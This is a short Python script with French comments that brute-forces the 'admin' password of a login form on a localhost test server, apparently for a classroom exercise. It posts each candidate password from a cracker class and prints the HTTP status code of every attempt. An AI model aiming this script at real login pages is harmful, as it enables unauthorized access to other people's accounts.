import requests
from BruteForceConnexion import BruteForceCracker

cracker = BruteForceCracker()  # Instanciation de la classe BruteForceCracker

url = 'http://localhost/tp_patron_conception/login.php'
login = "admin"
submit = "Login"
passwords = cracker.crack_password()  # Appel de la méthode crack_password() pour récupérer les mots de passe

for password in passwords:
    response = requests.post(
        url=url,
        data={
            "login": login,
            "password": password
        }
    )
    print("Mot de passe testé :", password)
    print("Code de statut de la réponse :", response.status_code)
    #print("Contenu de la réponse :", response.text)
    print("-------------------------------------")

    

    
